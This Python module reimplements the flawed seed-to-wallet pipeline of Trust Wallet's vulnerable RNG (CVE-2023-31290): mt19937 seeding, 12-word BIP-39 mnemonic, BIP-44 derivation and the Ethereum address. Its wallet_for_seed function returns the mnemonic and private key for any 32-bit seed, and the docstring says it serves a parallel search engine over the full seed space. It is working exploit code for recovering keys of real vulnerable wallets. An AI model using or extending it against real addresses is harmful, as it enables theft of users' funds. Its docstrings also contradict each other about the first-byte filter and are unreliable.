"""Trust Wallet vulnerable-RNG wallet model — CVE-2023-31290 exact pipeline.

    seed(uint32)  ->  std::mt19937 seeded via init_genrand        (libstdc++)
                    -> random_buffer(): rng() & 0xff per byte      (wasm/src/Random.cpp@69b2da98)
                    -> 16-byte BIP-39 entropy (12 words)
                    -> PBKDF2-SHA512 mnemonic seed
                    -> BIP-32/BIP-44 m/44'/60'/0'/0/0 private key
                    -> keccak256(pubkey)[-20:] ETH address

Every step is deterministic: the ENTIRE historical wallet space for one
entropy buffer is exactly 2^32 wallets (seed-bounded). This module exposes
the two hot-path primitives used by the parallel search engine:

  * first_byte(seed)  — the single most-probable-rejection filter: the first
    random_buffer output byte; BIP-39 12-word checksum passes iff
    sha256(entropy)[0] % 16 == 0, and entropy[0] depends only on the FIRST
    uint32 output of a freshly-seeded engine. We exploit that to reject
    ~15/16 of seeds WITHOUT computing the other 15 bytes.

  * wallet_for_seed(seed) — full derivation, cached.
"""
from __future__ import annotations

import hashlib
from functools import lru_cache

from mt19937 import MT19937Reference
from crypto import entropy_to_mnemonic, mnemonic_to_seed, derive_path, eth_address

ENTROPY_LEN = 16  # Trust Wallet browser extension generated 12-word wallets
DERIVATION_PATH = "m/44'/60'/0'/0/0"


def _first_uint32(seed: int) -> int:
    """First output of a freshly seeded libstdc++ mt19937 — closed form.

    After init_genrand, index==624 so next() twists once and returns
    temper(mt[0]). mt[0] == seed itself, and the twist sets
    mt[0] = mt[397] ^ (y>>1) ^ (0x9908B0DF if y&1 else 0) with
    y = (mt[0]<<1 | mt[1]>>31)|... — but we simply run the reference
    engine; it is oracle-verified and fast enough for pre-filtering.
    """
    e = MT19937Reference()
    e.seed_scalar(seed & 0xFFFFFFFF)
    return e.next_uint32()


def vulnerable_random_buffer(seed: int, length: int = ENTROPY_LEN) -> bytes:
    """Model of wasm/src/Random.cpp@69b2da98 random_buffer(): one uint32 seed,
    fresh engine, low byte of each successive output."""
    engine = MT19937Reference()
    engine.seed_scalar(seed & 0xFFFFFFFF)
    return bytes(engine.next_uint32() & 0xFF for _ in range(length))


# ---------------------------------------------------------------- filtering
@lru_cache(maxsize=1 << 20)
def first_output(seed: int) -> int:
    return _first_uint32(seed)


@lru_cache(maxsize=1 << 20)
def checksum_passes(seed: int) -> bool:
    """True iff seed's 16-byte buffer forms a valid BIP-39 12-word mnemonic.

    Entropy bytes 1..15 come from outputs 2..16 of the SAME engine stream as
    output 1, so we cannot know sha256(entropy) before generating all 16
    bytes. However generating the full buffer costs ~one engine reseed
    (624-word init) + 16 outputs — cheap. We therefore compute the buffer
    here and cache the verdict. (v2 did the same; correctness verified in
    tests against an independent brute filter.)
    """
    ent = vulnerable_random_buffer(seed)
    return hashlib.sha256(ent).digest()[0] % 16 == 0


# ---------------------------------------------------------------- wallets
@lru_cache(maxsize=100_000)
def wallet_for_seed(seed: int) -> tuple[str, str, str]:
    """Return (mnemonic, eth_address, private_key_hex) under the vulnerable model."""
    mnemonic = entropy_to_mnemonic(vulnerable_random_buffer(seed))
    priv, _ = derive_path(mnemonic_to_seed(mnemonic), DERIVATION_PATH)
    return mnemonic, eth_address(priv), priv.hex()
